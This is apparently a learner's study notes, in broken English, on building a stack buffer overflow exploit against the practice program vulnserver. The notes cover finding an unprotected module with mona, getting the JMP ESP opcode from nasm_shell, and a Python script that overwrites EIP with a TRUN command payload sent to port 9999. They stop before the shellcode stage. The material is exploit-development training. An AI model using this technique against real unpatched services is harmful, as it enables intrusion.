@@ -1,0 +1,69 @@
+Now, we should find the right module for the bufferover let us say that it was a "dll" or "something that was similar inside a prgram that was not having memory protections" it means that no depth, no ASLR, no safe ssh, etc . Now, for that we had someting tool called as MONA MODULEs that was used along/within the immunity debugger to achieve this.
+Now, go to the google and search the keyword such as "model modules" then when we search this we should be getting a github page belongs to the researcher named as "corelan/mona".
+Now, in that page dowload the program/module such as "mona.py" file  and then keep it at a specific folder in our windows machine such as path is "  This PC>Local Disk>Program Files(x86)>Immunity Debugger>PyCommands  " 
+Now, once we were ready just move to the immunity debugger and let our ulnserver be attached to it and then below of Debugger we had a search bar and type the key word such as ---> !mona modules & press enter then you will get a POP-UP window with some creapy stuff.
+
+Now, when we have a deep look we had some Protection settings such as ASLR, SafeSEM, Rebase and MXCompact & lot more. So these were the protection settings that we had with FALSE values. And these were the right ideals for us and also along with FALSE we had some  TRUES also but the real thing what we're looking for was something attached to "VULNSERVER" so we had something on RIGHT side with VULNSERVER attached. and we're looking up for all FALSES so the prime candidate immediately right away is "essfunc.dll" and then we should keep it in our minds because we actually need to do one other thing now that was if we know this by memory we can go back and can try this by type it out in the down in "search bar" but what sir want to show us that the process to find what we have to do to find the ".dll" thing. 
+What we have to do was we need to find the "opcode equivalent of a jump" . So, inorder to do that we have to go to the Kali_linux and locaate something called as nasm_shell so cmd was
+$ locate nasm_shell
+o/p:- /usr/bin/msf-nasm_shell
+
+        /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+Copy the above .rb and then paste it in terminal and do execute it by entering in terminal
+
+$  /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+o/p:- nasm > JMP ESP 
+    000000000       FFE4	jmp esp
+        nasm > 
+Now, jump back to debugger and then search the given one in the search bar below such as
+!mona find -s "\xff\xe4" -m essfunc.dll
+Now press enter and the we will be getting another window so that.
+Now, here we need to search something that was needed for our exploit so to do that we have to go with the below thing. 
+We were looking for the return addresses such as in the results tab so we got the result such as:-
+0x625011af : "\xff\xe4"  |  <PAGE_EXECUTE_READ> ....
+
+here the " 0x625011af " was our return address now write down the list of all return address and then we need to find which return address will be suited for us. And also we have something such as " essfunc.dll " at the right side of the same return address line such as " \xff\xe4 ". and the we were getting all the memory protections here listed as false. Now, with all these things we were ready so just open up your kali_linux machine.
+Type the below commands in our kali terminal such as we got " nasm shell running " don't exit the " nasm shell " in our kali_linux.
+-------------
+$ nasm > exit 
+-------------
+
+Now,  edit your python script which was written previously. and edit it.
+----------------------------------------------------
+2.py:-
+-------------
+$  gedit 2.py
+
+#!/usr/bin/python
+import sys, socket
+
+shellcode  =  "A"  *  2003  +  "\xaf\x11\x50\x62"
+
+# remove our old bad characters as well as --->  "B"  *  4  +  badchars  that was written previously.
+and write the return ddress such as 625011af & read notes for complete details
+
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.1.90',9999))
+	s.send(('TRUN  /.:/' + shellcode))
+except:
+	print "Error connecting to server"
+	sys.exit()
+------------------------------------------
+Now, before going to start the program minimize everything and just go to our IMMUNITY DEBUGGER that was there in our WINDOWS machine and then in that we had a small greenish arrow so press that and give the register address such that --->  625011af and then click ok  because it was our jump code
+Now, we had something called as jump code which was present in the 1st windows such as below
+ ----> 625011AF	FFE4	[JMP] ESP
+Now, what we need to do was just press F2 button and it will highlight everything with BLUE COLOR and then what it mean was we had set a BREAKPOINT so we have our brake point running. Now, what we had to do was we need to overflow the buffer but here we were hitting a specific spot this jump code it's not gonna to jump over the further instaructions such as it is actually going to break the program & pausing it for the further instructions from us so that was we we want. So see the below statement for clear explination
+
+*It mean that we are hitting it and overriding the EIP in the exact spot we need and then we are jumping forward so that whtat we are doing.
+-------------------------------
+Now, what we are doing means we were playing the DEBUGGER and then we are switching back to kali then in kali  we were executing our edited----> "2.py" 
+
+$ ./2.py
+o/p:- go to DEBUGGER in our windows 10 machine and see that we had breakpoint at --> essfunc.625011AF in the EIP which was highlighted in blue color.
+Now, we can see that the program is paused.
+It mean that we need to go with a shell code in order to get the ROOT access without any pressure. 
+ 
+
+	
